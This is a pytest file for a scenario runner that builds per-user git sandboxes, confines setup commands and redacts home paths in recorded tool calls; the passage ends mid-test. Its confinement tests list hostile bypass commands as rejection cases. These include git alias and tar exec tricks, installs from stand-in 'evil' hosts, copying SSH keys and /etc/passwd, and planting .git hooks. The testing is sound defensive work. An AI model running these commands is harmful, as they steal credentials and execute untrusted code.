"""Tests for runner module — scenario execution + subprocess error handling."""

from __future__ import annotations

import json
import os
import shutil
import stat
import subprocess
import sys
import tarfile
import tempfile
import zipfile
from dataclasses import dataclass
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import pytest
from scripts.runner import (
    SANDBOX_BASE,
    _parse_stream_json,
    _safe_sandbox_dir,
    _sandboxed_setup_command,
    _setup_sandbox,
    run_scenario,
)
from scripts.scenario_generator import Scenario


@dataclass(frozen=True)
class _FakeScenario:
    """Minimal Scenario-like object for runner tests (avoids generator deps)."""

    id: str
    prompt: str = "do nothing"
    setup_commands: tuple[str, ...] = ()


def _directory_symlink(link: Path, target: Path) -> None:
    """Create a test directory link, recognizing only unavailable Windows privilege."""
    try:
        link.symlink_to(target, target_is_directory=True)
    except OSError as error:
        if sys.platform == "win32" and getattr(error, "winerror", None) == 1314:
            pytest.skip("Windows symlink privilege is unavailable (error 1314)")
        raise


class TestDirectorySymlinkFixture:
    def test_windows_success_keeps_directory_link_flag(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(sys.modules[__name__], "sys", SimpleNamespace(platform="win32"))
        with patch.object(Path, "symlink_to") as create:
            _directory_symlink(tmp_path / "link", tmp_path / "target")
            create.assert_called_once_with(tmp_path / "target", target_is_directory=True)

    def test_only_windows_privilege_error_is_skipped(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(sys.modules[__name__], "sys", SimpleNamespace(platform="win32"))
        error = OSError("controlled missing symlink privilege")
        setattr(error, "winerror", 1314)
        with patch.object(Path, "symlink_to", side_effect=error):
            with pytest.raises(pytest.skip.Exception, match="error 1314"):
                _directory_symlink(tmp_path / "link", tmp_path / "target")

    @pytest.mark.parametrize(
        ("platform", "winerror"),
        [("win32", 5), ("win32", None), ("linux", 1314), ("darwin", 1314)],
    )
    def test_other_errors_still_fail(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
        platform: str, winerror: int | None,
    ) -> None:
        monkeypatch.setattr(sys.modules[__name__], "sys", SimpleNamespace(platform=platform))
        error = PermissionError("controlled unrelated link failure")
        if winerror is not None:
            setattr(error, "winerror", winerror)
        with patch.object(Path, "symlink_to", side_effect=error):
            with pytest.raises(OSError) as exc_info:
                _directory_symlink(tmp_path / "link", tmp_path / "target")
        assert exc_info.value is error


class TestSafeSandboxDirectory:
    def test_empty_id_cannot_delete_the_shared_base(self) -> None:
        with (
            patch("scripts.runner.Path.exists", return_value=True),
            patch("scripts.runner.shutil.rmtree") as remove,
            patch("scripts.runner.Path.mkdir") as mkdir,
            patch("scripts.runner.subprocess.run") as execute,
        ):
            execute.return_value = subprocess.CompletedProcess([], 0, stdout="", stderr="")
            with pytest.raises(ValueError, match="sandbox"):
                run_scenario(_FakeScenario(id=""))
            remove.assert_not_called()
            mkdir.assert_not_called()
            execute.assert_not_called()

    def test_resolved_base_is_not_a_scenario_directory(self) -> None:
        with patch("scripts.runner.Path.resolve", return_value=SANDBOX_BASE):
            with pytest.raises(ValueError, match="sandbox"):
                _safe_sandbox_dir("alias")

    def test_valid_id_keeps_existing_sanitization(self) -> None:
        assert _safe_sandbox_dir("scenario/one") == SANDBOX_BASE / "scenario_one"

    def test_resolved_escape_is_still_rejected(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        base = tmp_path / "sandbox"
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        with patch.object(Path, "resolve", side_effect=[tmp_path / "outside", base]):
            with pytest.raises(ValueError):
                _safe_sandbox_dir("escape")


class TestSandboxBaseBoundary:
    def test_live_base_link_preserves_outside_files(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        outside = tmp_path / "outside"
        target = outside / "probe"
        target.mkdir(parents=True)
        sentinel = target / "sentinel"
        sentinel.write_bytes(b"outside must remain unchanged")
        base = tmp_path / "base"
        _directory_symlink(base, outside)
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        with pytest.raises(ValueError, match="base"):
            _safe_sandbox_dir("probe")
        assert sentinel.read_bytes() == b"outside must remain unchanged"
        assert not (target / ".git").exists()

    def test_setup_rechecks_base_before_cleanup(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        base = tmp_path / "base"
        base.mkdir()
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        selected = _safe_sandbox_dir("probe")
        outside = tmp_path / "outside"
        target = outside / "probe"
        target.mkdir(parents=True)
        sentinel = target / "sentinel"
        sentinel.write_bytes(b"outside must remain unchanged")
        base.rmdir()
        _directory_symlink(base, outside)
        with pytest.raises(ValueError, match="base"):
            _setup_sandbox(selected, Scenario(id="probe", level=1, level_name="test", description="Disposable setup", prompt="No provider", setup_commands=()))
        assert sentinel.read_bytes() == b"outside must remain unchanged"
        assert not (target / ".git").exists()

    def test_public_scenario_rejects_base_link_before_subprocess(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        outside = tmp_path / "outside"
        target = outside / "probe"
        target.mkdir(parents=True)
        sentinel = target / "sentinel"
        sentinel.write_bytes(b"outside must remain unchanged")
        base = tmp_path / "base"
        _directory_symlink(base, outside)
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        with patch("scripts.runner.subprocess.run") as execute:
            with pytest.raises(ValueError, match="base"):
                run_scenario(Scenario(id="probe", level=1, level_name="test", description="Disposable setup", prompt="No provider", setup_commands=()))
            execute.assert_not_called()
        assert sentinel.read_bytes() == b"outside must remain unchanged"

    def test_dangling_base_link_is_rejected(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        base = tmp_path / "base"
        _directory_symlink(base, tmp_path / "missing")
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        with pytest.raises(ValueError, match="base"):
            _safe_sandbox_dir("probe")

    @pytest.mark.parametrize("entry", ["safe", "setup"])
    def test_directory_reparse_attributes_are_rejected(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, entry: str
    ) -> None:
        base = tmp_path / "base"
        target = base / "probe"
        target.mkdir(parents=True)
        sentinel = target / "sentinel"
        sentinel.write_bytes(b"preserve before reparse refusal")
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        original = Path.lstat
        def controlled_lstat(path: Path) -> object:
            if path == base:
                return SimpleNamespace(st_mode=stat.S_IFDIR | 0o700, st_file_attributes=0x400)
            return original(path)
        monkeypatch.setattr(Path, "lstat", controlled_lstat)
        with patch("scripts.runner.subprocess.run") as execute:
            with pytest.raises(ValueError, match="base"):
                if entry == "safe":
                    _safe_sandbox_dir("probe")
                else:
                    _setup_sandbox(target, Scenario(id="probe", level=1, level_name="test", description="Disposable setup", prompt="No provider", setup_commands=()))
            execute.assert_not_called()
        assert sentinel.read_bytes() == b"preserve before reparse refusal"

    @pytest.mark.parametrize("existing", [False, True])
    def test_valid_setup_preserves_outside_sentinel(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, existing: bool
    ) -> None:
        base = tmp_path / "base"
        target = base / "probe"
        if existing:
            target.mkdir(parents=True)
            (target / "stale").write_bytes(b"prior scenario")
        outside = tmp_path / "outside-sentinel"
        outside.write_bytes(b"preserve outside")
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        _setup_sandbox(_safe_sandbox_dir("probe"), Scenario(id="probe", level=1, level_name="test", description="Disposable setup", prompt="No provider", setup_commands=()))
        assert (target / ".git").is_dir()
        assert not (target / "stale").exists()
        assert outside.read_bytes() == b"preserve outside"

    def test_regular_file_base_is_rejected_before_cleanup(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        base = tmp_path / "base"
        base.write_bytes(b"preserve base file")
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        with patch("scripts.runner.subprocess.run") as execute:
            with pytest.raises(ValueError, match="base"):
                _safe_sandbox_dir("probe")
            execute.assert_not_called()
        assert base.read_bytes() == b"preserve base file"

    def test_parent_alias_remains_usable(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        parent = tmp_path / "real-parent"
        parent.mkdir()
        alias = tmp_path / "parent-alias"
        _directory_symlink(alias, parent)
        base = alias / "base"
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        target = _safe_sandbox_dir("probe")
        _setup_sandbox(target, Scenario(id="probe", level=1, level_name="test", description="Disposable setup", prompt="No provider", setup_commands=()))
        assert (parent / "base/probe/.git").is_dir()


class TestSetupSandboxSkipsShellBuiltins:
    """Setup commands containing shell builtins (cd/pushd/popd) must be skipped.

    Regression: subprocess.run(["cd", ...]) raises FileNotFoundError because
    cd is a shell builtin, not an external binary. Real-world scenarios often
    include "cd subdir" in setup_commands assuming shell semantics, so the
    runner must tolerate this rather than crashing the whole scenario.
    """

    def test_skips_cd(self, tmp_path):
        scenario = _FakeScenario(
            id="t1",
            setup_commands=("cd subdir",),
        )
        called_args: list[list[str]] = []

        def fake_run(args, **kwargs):
            called_args.append(args)
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            _setup_sandbox(tmp_path, scenario)

        # git init runs once; "cd subdir" must NOT be passed to subprocess
        assert ["git", "init"] in called_args
        assert ["cd", "subdir"] not in called_args

    def test_skips_pushd_popd(self, tmp_path):
        scenario = _FakeScenario(
            id="t2",
            setup_commands=("pushd dir", "popd"),
        )
        called_args: list[list[str]] = []

        def fake_run(args, **kwargs):
            called_args.append(args)
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            _setup_sandbox(tmp_path, scenario)

        assert ["pushd", "dir"] not in called_args
        assert ["popd"] not in called_args

    def test_tolerates_missing_executable(self, tmp_path):
        """A scenario referencing an unavailable tool must not crash setup."""
        scenario = _FakeScenario(
            id="t3",
            setup_commands=("nonexistent-tool-xyz arg",),
        )

        def fake_run(args, **kwargs):
            if args[0] == "nonexistent-tool-xyz":
                raise FileNotFoundError(2, "No such file or directory")
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            # Must NOT raise — missing tools are skipped, not fatal
            _setup_sandbox(tmp_path, scenario)

    def test_real_commands_still_run(self, tmp_path):
        """Skip logic must not break legitimate setup commands."""
        scenario = _FakeScenario(
            id="t4",
            setup_commands=("touch file.txt", "cd ignored", "echo hi"),
        )
        called_args: list[list[str]] = []

        def fake_run(args, **kwargs):
            called_args.append(args)
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            _setup_sandbox(tmp_path, scenario)

        # Real commands present, cd absent
        assert ["touch", "file.txt"] in called_args
        assert ["echo", "hi"] in called_args
        assert ["cd", "ignored"] not in called_args


_GIT = ["git", "-c", f"core.hooksPath={os.devnull}"]


def _run_setup(sandbox: Path, *commands: str) -> list[list[str]]:
    """Run _setup_sandbox with a fake subprocess and return the argv it executed."""
    called: list[list[str]] = []

    def fake_run(args, **kwargs):
        called.append(list(args))
        return subprocess.CompletedProcess(args=args, returncode=0)

    with patch("scripts.runner.subprocess.run", side_effect=fake_run):
        _setup_sandbox(sandbox, _FakeScenario(id="confine", setup_commands=commands))
    assert called[0] == ["git", "init"]
    return called[1:]


class TestSetupCommandConfinement:
    """Allowed tools keep their file-creating uses but lose their code-running ones."""

    @pytest.mark.parametrize("command", [
        # git: inline config, aliases, global options, hook/config writes
        "git -c 'alias.x=!touch /tmp/pwned' x",
        "git -c core.fsmonitor=evil status",
        "git --config-env=core.pager=EVIL log",
        "git -C .. init",
        "git config alias.x '!sh -c id'",
        "git config core.hooksPath hooks",
        "git config core.sshCommand evil",
        "git config --global user.name x",
        "git clone --upload-pack='touch /tmp/pwned' repo",
        "git fetch --upload-pack=evil origin",
        # tar: program-running options, abbreviated or bundled
        "tar -cf /dev/null x --to-command='sh -c id'",
        "tar --checkpoint=1 --checkpoint-action=exec='sh -c id' -cf a.tar .",
        "tar --use-compress-program='sh -c id' -cf a.tar src",
        "tar -I 'sh -c id' -cf a.tar src",
        "tar cIf evil a.tar src",
        "tar --to-com=sh -xf a.tar",
        "tar -xf host:archive.tar",
        # npm: arbitrary package sources, scripts, exec, global installs
        "npm install git+https://example.com/evil.git",
        "npm install https://example.com/evil.tgz",
        "npm install ./evil",
        "npm install user/repo",
        "npm install -g evil",
        "npm install --foreground-scripts evil",
        "npm exec evil-pkg",
        "npm run build",
        "npm init evil",
        # pip: source builds, editable/local/VCS installs, other indexes
        "pip install -e .",
        "pip install git+https://example.com/evil.git",
        "pip install ./evil",
        "pip install -r requirements.txt",
        "pip install --index-url https://evil.example/simple x",
        "pip3 install --user evil",
        "pip download evil",
        # cp/mv/chmod/touch/mkdir/unzip: paths outside the sandbox or into .git
        "cp ~/.ssh/id_ed25519 .",
        "cp /etc/passwd .",
        "cp ../../secret .",
        "cp -t.. file",
        "cp --target-directory=/tmp file",
        "mv src /tmp/elsewhere",
        "mv src ..",
        "cp file .git/hooks/pre-commit",
        "chmod +x .git/hooks/pre-commit",
        "touch -r /etc/shadow x",
        "mkdir -p /tmp/skill-comply-sandbox/x",
        "unzip a.zip -d /tmp/out",
        # git options that install hooks or move the repository
        "git init --template=templates",
        "git init --separate-git-dir=gitdir",
        "git commit --template=msg -m x",
        "git add --chmod=+x hook",
        # option values attached to the flag
        "cp -r --target-directory=.git hooks",
        "cp -r -t.git hooks",
        "cp -rt.GIT hooks",
        "tar -xf hooks.tar --directory=.git",
        "unzip 'payload*'",
        "unzip -P pw payload.zip",
        "unzip -P good.zip payload.zip",
        "unzip -d",
        "unzip -q",
    ])
    def test_bypass_is_not_executed(self, tmp_path: Path, command: str) -> None:
        assert _run_setup(tmp_path / "sandbox", command) == []

    @pytest.mark.parametrize("command,expected", [
        ("mkdir -p src tests", ["mkdir", "-p", "src", "tests"]),
        ("touch src/__init__.py", ["touch", "src/__init__.py"]),
        ("echo hello", ["echo", "hello"]),
        ("git add .", [*_GIT, "add", "."]),
        ("git commit -m 'initial commit'", [*_GIT, "commit", "-m", "initial commit"]),
        ("git config user.email test@example.com", [*_GIT, "config", "user.email", "test@example.com"]),
        ("git checkout -b feature/x", [*_GIT, "checkout", "-b", "feature/x"]),
        ("cp src/a.py src/b.py", ["cp", "src/a.py", "src/b.py"]),
        ("mv src/a.py lib.py", ["mv", "src/a.py", "lib.py"]),
        ("chmod +x run.sh", ["chmod", "+x", "run.sh"]),
        ("tar -czf src.tar.gz src", ["tar", "-czf", "src.tar.gz", "src"]),
        ("tar xzf src.tar.gz", ["tar", "xzf", "src.tar.gz"]),
        ("npm init -y", ["npm", "init", "-y"]),
        (
            "npm install --save-dev jest@29 @types/node",
            ["npm", "install", "--save-dev", "jest@29", "@types/node", "--ignore-scripts"],
        ),
    ])
    def test_normal_setup_still_runs(self, tmp_path: Path, command: str, expected: list[str]) -> None:
        assert _run_setup(tmp_path / "sandbox", command) == [expected]

    def test_pip_install_is_wheel_only_and_stays_in_sandbox(self, tmp_path: Path) -> None:
        sandbox = tmp_path / "sandbox"
        assert _run_setup(sandbox, "pip install pytest 'requests>=2'") == [[
            "pip", "install", "pytest", "requests>=2",
            "--only-binary=:all:", "--target", str(sandbox / ".pip-packages"),
        ]]

    def test_absolute_path_inside_sandbox_is_allowed(self, tmp_path: Path) -> None:
        sandbox = tmp_path / "sandbox"
        assert _run_setup(sandbox, f"mkdir -p {sandbox}/src") == [["mkdir", "-p", f"{sandbox}/src"]]


class TestArchiveMembers:
    """tar -x / unzip only run when every member is a plain file outside .git."""

    @pytest.mark.parametrize("name,ok", [
        ("src/a.py", True),
        (".gitignore", True),
        (".git/hooks/pre-commit", False),
        ("sub/.GIT/config", False),
        ("../escape", False),
        ("/abs", False),
        ("a\\..\\..\\x", False),
    ])
    def test_member_names(self, tmp_path: Path, name: str, ok: bool) -> None:
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        with tarfile.open(sandbox / "a.tar", "w") as archive:
            archive.addfile(tarfile.TarInfo(name))
        with zipfile.ZipFile(sandbox / "a.zip", "w") as archive:
            archive.writestr(name, "")
        for command in ("tar -xf a.tar", "unzip a.zip"):
            assert (_sandboxed_setup_command(command.split(), sandbox) is not None) is ok, command

    def test_archive_after_other_option_arguments_is_checked(self, tmp_path: Path) -> None:
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        with tarfile.open(sandbox / "bad.tar", "w") as archive:
            archive.addfile(tarfile.TarInfo(".git/hooks/pre-commit"))
        with tarfile.open(sandbox / "good.tar", "w") as archive:
            archive.addfile(tarfile.TarInfo("src/a.py"))
        # old-style clusters take their option arguments in letter order: C gets ".", f the archive
        for name, ok in (("bad.tar", False), ("good.tar", True)):
            for command in (f"tar xCf . {name}", f"tar -xC . -f {name}"):
                assert (_sandboxed_setup_command(command.split(), sandbox) is not None) is ok, command

    def test_links_and_unknown_formats_are_refused(self, tmp_path: Path) -> None:
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        link = tarfile.TarInfo("inside")
        link.type, link.linkname = tarfile.SYMTYPE, "elsewhere"
        with tarfile.open(sandbox / "link.tar", "w") as archive:
            archive.addfile(link)
        (sandbox / "a.tar.zst").write_bytes(b"\x28\xb5\x2f\xfd")
        assert _sandboxed_setup_command(["tar", "-xf", "link.tar"], sandbox) is None
        assert _sandboxed_setup_command(["tar", "-xf", "a.tar.zst"], sandbox) is None
        assert _sandboxed_setup_command(["tar", "-cf", "out.tar", "a.tar.zst"], sandbox) is not None

    def test_selected_members_are_not_checked_as_archives(self, tmp_path: Path) -> None:
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        (sandbox / "README.md").write_text("stale")
        src = tmp_path / "fresh"
        src.mkdir()
        (src / "README.md").write_text("restored")
        with tarfile.open(sandbox / "fixtures.tar", "w") as archive:
            archive.add(src / "README.md", arcname="README.md")
        for command in ("tar -xf fixtures.tar README.md", "tar xf fixtures.tar README.md", "tar --file=fixtures.tar -x README.md"):
            argv = _sandboxed_setup_command(command.split(), sandbox)
            assert argv is not None, command
            (sandbox / "README.md").write_text("stale")
            subprocess.run(argv, cwd=sandbox, check=True)
            assert (sandbox / "README.md").read_text() == "restored", command
        # members under .git or outside the sandbox stay refused
        assert _sandboxed_setup_command(["tar", "-xf", "fixtures.tar", ".git/hooks/pre-commit"], sandbox) is None
        assert _sandboxed_setup_command(["tar", "-xf", "fixtures.tar", "../x"], sandbox) is None
        # the archive operand is still checked even when members are selected
        (sandbox / "bad.tar").write_bytes(b"not an archive")
        assert _sandboxed_setup_command(["tar", "-xf", "bad.tar", "README.md"], sandbox) is None
        with zipfile.ZipFile(sandbox / "f.zip", "w") as archive:
            archive.writestr("README.md", "restored")
        assert _sandboxed_setup_command(["unzip", "-o", "f.zip", "README.md"], sandbox) is not None


class TestUnzipArchiveBinding:
    """The extractor must open the exact existing ZIP whose members were checked."""

    @staticmethod
    def archive(path: Path, name: str = "data/value.txt") -> None:
        with zipfile.ZipFile(path, "w") as archive:
            archive.writestr(name, "checked fixture")

    @pytest.mark.parametrize("flags", [[], ["-o"], ["-n"], ["-q"], ["-qq"], ["-j"], ["-oq"]])
    def test_safe_archive_is_bound_to_its_checked_path(self, tmp_path: Path, flags: list[str]) -> None:
        archive = tmp_path / "safe.zip"
        self.archive(archive)
        argv = _sandboxed_setup_command(["unzip", *flags, "safe.zip", "-d", "output"], tmp_path)
        assert argv == ["unzip", *flags, str(archive.resolve()), "-d", "output"]
        if not shutil.which("unzip"):
            pytest.skip("unzip is unavailable")
        subprocess.run(argv, cwd=tmp_path, check=True, capture_output=True)
        target = "value.txt" if "-j" in flags else "data/value.txt"
        assert (tmp_path / "output" / target).read_text() == "checked fixture"

    def test_destination_before_archive_and_selected_member_are_preserved(self, tmp_path: Path) -> None:
        archive = tmp_path / "safe.zip"
        self.archive(archive)
        argv = _sandboxed_setup_command(["unzip", "-d", "output", "-o", "safe.zip", "data/value.txt"], tmp_path)
        assert argv == ["unzip", "-d", "output", "-o", str(archive.resolve()), "data/value.txt"]
        if not shutil.which("unzip"):
            pytest.skip("unzip is unavailable")
        subprocess.run(argv, cwd=tmp_path, check=True, capture_output=True)
        assert (tmp_path / "output/data/value.txt").read_text() == "checked fixture"

    @pytest.mark.parametrize("member", ["data/value.txt", ".git/hooks/post-commit"])
    def test_missing_archive_never_uses_implicit_zip_suffix(self, tmp_path: Path, member: str) -> None:
        self.archive(tmp_path / "payload.zip", member)
        assert _sandboxed_setup_command(["unzip", "-o", "payload"], tmp_path) is None

    def test_existing_extensionless_zip_is_allowed_without_suffix_lookup(self, tmp_path: Path) -> None:
        archive = tmp_path / "payload"
        self.archive(archive)
        self.archive(tmp_path / "payload.zip", ".git/hooks/post-commit")
        argv = _sandboxed_setup_command(["unzip", "-o", "payload"], tmp_path)
        assert argv == ["unzip", "-o", str(archive.resolve())]
        if not shutil.which("unzip"):
            pytest.skip("unzip is unavailable")
        subprocess.run(argv, cwd=tmp_path, check=True, capture_output=True)
        assert (tmp_path / "data/value.txt").read_text() == "checked fixture"
        assert not (tmp_path / ".git/hooks/post-commit").exists()

    @pytest.mark.parametrize("password", ["pw", "good.zip"])
    def test_password_options_cannot_hide_the_real_archive(self, tmp_path: Path, password: str) -> None:
        self.archive(tmp_path / "good.zip")
        self.archive(tmp_path / "payload.zip", ".git/hooks/post-commit")
        assert _sandboxed_setup_command(["unzip", "-P", password, "payload.zip"], tmp_path) is None

    @pytest.mark.parametrize("args", [
        [], ["-q"], ["-d"], ["safe.zip", "-d"], ["-d", "-q", "safe.zip"],
        ["-Ppw", "safe.zip"], ["-Z", "safe.zip"], ["-T", "safe.zip"],
        ["-doutput", "safe.zip"], ["--unrecognized", "safe.zip"], ["safe*"],
    ])
    def test_missing_or_ambiguous_arguments_are_not_executed(self, tmp_path: Path, args: list[str]) -> None:
        self.archive(tmp_path / "safe.zip")
        assert _sandboxed_setup_command(["unzip", *args], tmp_path) is None


class TestSandboxBaseOwnership:
    def test_default_base_is_per_user(self) -> None:
        if hasattr(os, "getuid"):
            assert SANDBOX_BASE.name == f"skill-comply-sandbox-{os.getuid()}"
        assert SANDBOX_BASE.parent == Path(tempfile.gettempdir())

    @pytest.mark.skipif(sys.platform == "win32", reason="POSIX modes only")
    @pytest.mark.parametrize("existing", [False, True])
    def test_setup_leaves_base_private(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, existing: bool
    ) -> None:
        base = tmp_path / "base"
        if existing:
            base.mkdir()
            base.chmod(0o777)
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        _run_setup(base / "probe")
        assert stat.S_IMODE(base.stat().st_mode) == 0o700

    @pytest.mark.skipif(not hasattr(os, "getuid"), reason="POSIX ownership only")
    def test_foreign_owned_base_is_rejected(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        base = tmp_path / "base"
        base.mkdir()
        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
        real_uid = os.getuid()
        monkeypatch.setattr("scripts.runner.os.getuid", lambda: real_uid + 1)
        with patch("scripts.runner.subprocess.run") as execute:
            with pytest.raises(ValueError, match="owned"):
                _setup_sandbox(base / "probe", _FakeScenario(id="probe"))
            execute.assert_not_called()
        assert not (base / "probe").exists()


class TestRunScenarioMaxTurnsTermination:
    """rc=1 with terminal_reason=max_turns is graceful termination, not failure.

    claude -p returns rc=1 when --max-turns is reached, but the stream-json
    output is still valid. Treating this as RuntimeError aborts scenarios
    that would have produced useful observations. Detect the marker in stdout
    and downgrade rc=1 + max_turns to non-fatal.
    """

    def test_rc1_with_max_turns_marker_returns_normally(self, tmp_path, monkeypatch):
        scenario = _FakeScenario(id="mt1", prompt="long task", setup_commands=())

        # Skip sandbox setup side effects
        monkeypatch.setattr("scripts.runner._setup_sandbox", lambda *a, **kw: None)

        max_turns_stdout = (
            '{"type":"system","subtype":"init","session_id":"s1"}\n'
            '{"type":"result","terminal_reason":"max_turns"}\n'
        )

        fake_result = subprocess.CompletedProcess(
            args=["claude"], returncode=1, stdout=max_turns_stdout, stderr=""
        )

        with patch("scripts.runner.subprocess.run", return_value=fake_result):
            # Must NOT raise — max_turns is graceful termination
            run_scenario(scenario, model="haiku")

    def test_rc1_without_max_turns_marker_still_raises(self, tmp_path, monkeypatch):
        """Real failures (rc≠0 with no max_turns marker) must still raise."""
        scenario = _FakeScenario(id="mt2", prompt="oops", setup_commands=())
        monkeypatch.setattr("scripts.runner._setup_sandbox", lambda *a, **kw: None)

        fake_result = subprocess.CompletedProcess(
            args=["claude"], returncode=1, stdout="", stderr="auth error"
        )

        with patch("scripts.runner.subprocess.run", return_value=fake_result):
            with pytest.raises(RuntimeError, match="claude -p failed"):
                run_scenario(scenario, model="haiku")


@pytest.mark.unit
class TestParseStreamJsonRedactsHomePath:
    """Observations feed grade() and then a written report (results/<skill>.md) —
    a raw absolute path bakes the operator's username into every tool call
    that touched anything under $HOME. --add-dir restricts the sandbox, but
    scenario setup_commands or the model's own tool calls can still reference
    $HOME directly (e.g. a Bash command using ~ expansion, or a scenario that
    legitimately needs to read a dotfile). Redact to a portable placeholder
    rather than persisting the raw path.
    """

    def _stream_json_for(self, tool_input: dict, output_content: object) -> str:
        return (
            '{"type":"assistant","message":{"content":[{"type":"tool_use",'
            '"id":"tu1","name":"Read","input":' + json.dumps(tool_input) + "}]}}\n"
            '{"type":"user","session_id":"s1","message":{"content":[{"type":'
            '"tool_result","tool_use_id":"tu1","content":' + json.dumps(output_content) + "}]}}\n"
        )

    @staticmethod
    def _set_home(monkeypatch: pytest.MonkeyPatch, home: str) -> None:
        monkeypatch.setattr(Path, "home", classmethod(lambda cls: Path(home)))

    def test_posix_input_string_leaves_and_embedded_paths_redacted(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        home = "/home/alice"
        self._set_home(monkeypatch, home)
        stdout = self._stream_json_for(
            {
                "command": f"cat '{home}/notes/secrets.env' && echo home={home}, done",
                "nested": {"paths": [f"{home}/one", f"{home}/two"]},
            },
            "irrelevant output",
        )
        events = _parse_stream_json(stdout)

        assert len(events) == 1
        assert home not in events[0].input
        parsed_input = json.loads(events[0].input)
        assert parsed_input["command"] == "cat '~/notes/secrets.env' && echo home=~, done"
        assert parsed_input["nested"]["paths"] == ["~/one", "~/two"]

    def test_windows_home_with_unicode_and_backslashes_redacted(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        home = r"C:\Users\Zoë"
        self._set_home(monkeypatch, home)
        stdout = self._stream_json_for(
            {
                "paths": [
                    home + r"\Documents\résumé.txt",
                    "C:/Users/Zoë/資料.txt",
                ]
            },
            "irrelevant output",
        )
        events = _parse_stream_json(stdout)

        assert len(events) == 1
        parsed_input = json.loads(events[0].input)
        assert parsed_input["paths"] == [
            r"~\Documents\résumé.txt",
            "~/資料.txt",
        ]

    def test_mapping_keys_are_redacted_without_silent_collision(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        home = r"C:\Users\Zoë"
        self._set_home(monkeypatch, home)
        stdout = self._stream_json_for(
            {
                home + r"\private.txt": "first",
                r"c:\users\zoë\private.txt": "second",
            },
            "irrelevant output",
        )
        events = _parse_stream_json(stdout)

        parsed_input = json.loads(events[0].input)
        assert home not in events[0].input
        assert parsed_input == {
            r"~\private.txt": "first",
            r"~\private.txt#2": "second",
        }

    def test_sibling_and_embedded_prefix_paths_untouched(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        home = "/home/alice"
        self._set_home(monkeypatch, home)
        outside_paths = [
            "/home/alice-old/report.txt",
            "/home/alice2/report.txt",
            "/tmp/home/alice/report.txt",
        ]
        stdout = self._stream_json_for(
            {"paths": outside_paths},
            [{"type": "text", "text": path} for path in outside_paths],
        )
        events = _parse_stream_json(stdout)

        assert json.loads(events[0].input)["paths"] == outside_paths
        assert [item["text"] for item in json.loads(events[0].output)] == outside_paths

    def test_list_output_redacts_nested_string_leaves(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        home = "/Users/reviewer"
        self._set_home(monkeypatch, home)
        output_content = [
            {"type": "text", "text": f"created {home}/résumé.txt"},
            {"type": "metadata", "paths": [home, f"{home}/資料.json"]},
        ]
        stdout = self._stream_json_for({"file_path": "irrelevant"}, output_content)
        events = _parse_stream_json(stdout)

        assert json.loads(events[0].output) == [
            {"type": "text", "text": "created ~/résumé.txt"},
            {"type": "metadata", "paths": ["~", "~/資料.json"]},
        ]

    def test_redacts_before_json_serialization_and_5000_character_truncation(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        home = "/home/alice"
        self._set_home(monkeypatch, home)
        boundary_value = "x" * 4977 + f" {home}/secret.txt" + "tail" * 20
        stdout = self._stream_json_for(
            {"command": boundary_value},
            boundary_value,
        )
        events = _parse_stream_json(stdout)

        assert len(events[0].input) == 5000
        assert "~/secret" in events[0].input
        assert "/home/" not in events[0].input
        assert len(events[0].output) == 5000
        assert "~/secret.txt" in events[0].output
        assert "/home/" not in events[0].output


class TestRunScenarioErrorIncludesStdoutTail:
    """Error messages must include stdout tail, not only stderr.

    When claude -p fails inside an LLM call, useful diagnostic context often
    appears in stdout (partial stream-json events, model error JSON), not
    stderr. Including stdout tail in the RuntimeError message dramatically
    improves debug-ability without adding any new dependency.
    """

    def test_error_message_contains_stdout_tail(self, tmp_path, monkeypatch):
        scenario = _FakeScenario(id="e1", prompt="x", setup_commands=())
        monkeypatch.setattr("scripts.runner._setup_sandbox", lambda *a, **kw: None)

        diagnostic_marker = "DIAG_STDOUT_MARKER_xyz123"
